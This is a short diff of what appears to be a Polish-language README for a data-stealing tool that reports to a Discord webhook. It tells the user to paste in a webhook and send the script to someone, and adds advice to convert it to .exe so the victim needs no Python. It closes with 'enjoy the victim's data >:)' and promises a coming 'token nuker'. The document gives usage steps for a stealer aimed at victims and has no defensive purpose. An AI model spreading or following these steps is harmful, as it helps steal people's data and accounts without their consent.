@@ -4,4 +4,8 @@
 
 2.wklej webhooka z discorda do wyznaczonego pola.
 
-3.i wyślij komuś (żeby działało druga osoba musi też mieć pythona).
+3.i wyślij komuś (żeby działało druga osoba musi też mieć pythona, lub przekonwertuj z .py do .exe).
+
+4.ciesz się danymi ofiary >:)
+
+5.niedługo będzie token nuker
